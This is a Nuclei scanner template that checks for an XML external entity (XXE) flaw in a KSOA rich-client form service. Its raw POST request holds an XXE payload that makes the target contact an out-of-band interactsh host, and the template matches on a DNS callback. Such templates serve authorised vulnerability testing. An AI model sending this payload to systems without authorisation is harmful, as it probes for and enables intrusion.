id: ksoa-richclient-xxe

info:
  name: ksoa-richclient-xxe
  author: iSee857
  severity: high
  description: |
    ksoa-richclient-xxe.
  metadata:
    verified: true
    max-request: 1

http:
  - raw:
      - |
        POST /formservice?service=richclient.openForm HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
        <root/>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: status
        status:
          - 200
